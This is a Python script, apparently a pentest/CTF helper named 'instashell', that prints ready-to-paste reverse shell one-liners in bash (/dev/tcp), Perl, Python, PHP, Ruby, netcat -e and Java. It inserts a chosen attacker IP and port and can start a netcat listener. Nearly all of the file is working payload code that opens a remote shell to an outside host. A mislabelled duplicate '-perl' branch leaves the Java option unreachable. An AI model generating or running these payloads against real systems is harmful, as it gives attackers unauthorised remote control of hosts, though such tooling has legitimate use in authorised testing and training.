#!/bin/python3

import os
import sys

# Writen by Checkn8
# Shell syntax was taken from the Pentest Monkey reverse shell cheart sheat. 
# Help page
if sys.argv[1] == "--help": #sys.argv[0] or 
    print('''
    Description:\n
    instashell generates the correct reverse shell syntax for any code platform for easy injection during a pentest or CTF.\n
    Usage:\n
    instashell <option> <ip> <port> <listener>\n
    
    
    
    Options:\n
    -bash  Bash shell\n
    -perl  Perl shell\n
    -py    Python shell\n
    -php   PHP shell\n
    -ruby  Ruby shell\n
    -nc    Netcat shell\n
    -java  Java shell\n
    
    IP:\n
    -tun0         Automtically parses your IP address on tun0 when using a vpn.\n
    <custom ip>   Enter your own IP\n
    
    Listener:\n
    -l     Starts a netcat listener\n
    ''')
    exit()

def spawn_shell (shell, port, ip):
    # check the shell type

    # Bash
    if shell == "-bash":
        print("Copy the syntax below")
        print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        

    # Perl
    elif shell == "-perl":
        print("Copy the syntax below")
        print("""perl -e 'use Socket;$i=""" + ip + """;$p=""" + port + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
        

    # Python
    elif shell == "-py":
        print("Copy the syntax below")
        print('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip +'''",''' + port + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
        

    # PHP
    elif shell == "-php":
        print("Copy the syntax below")
        print('''php -r '$sock=fsockopen("''' + ip + '''",''' + port + """);exec("/bin/sh -i <&3 >&3 2>&3");'""")
        

    # Ruby
    elif shell == "-ruby":
        print("Copy the syntax below")
        print('''ruby -rsocket -e'f=TCPSocket.open("''' + ip +'''",''' + port + """).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
        

    # Netcat
    elif shell == "-nc":
        print("Copy the syntax below. ** This will only work with netcat versions that support -e. **")
        print("nc -e /bin/sh " + ip + " " + port )
        

    # Perl
    elif shell == "-perl":
        print("Copy the syntax below")
        print('''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/''' + ip + '''/''' + port +''';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()''')
        
            
    else:
        print("Invalid Syntax Order: use --help for usage info")

def nc ():
    if len(sys.argv) == 5:
        if sys.argv[4] == "-l":
            print("\n[+] Starting Netcat listener\n")
            nc = str("nc -lnvp " + str(port))
            os.system(nc)
    if len(sys.argv) != 5:
        exit()

# Check if valid params were passed
if len(sys.argv) >= 4:
    
    # Check if tun0 is enabled
    if sys.argv[2] == "-tun0":
    	try:
    		ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    	except:
    		print("[-] Please connect tun0")
    		exit()
    else:
    	ip = sys.argv[2]
    
    shell_type = sys.argv[1]
    port = sys.argv[3]
    port = str(port)
    
    # Displays the shell syntax
    spawn_shell(shell_type, port, ip)
    
    # starts a nc listener with -l option
    nc()
    '''if len(sys.argv) == 5:
        if sys.argv[4] == "-l":
            print("\n[+] Starting Netcat listener\n")
            nc = str("nc -lnvp " + str(port))
            os.system(nc)
    if len(sys.argv) != 5:
        exit()'''

else:
    print("To Few Arguments Supplied: use --help for usage info")
    exit()
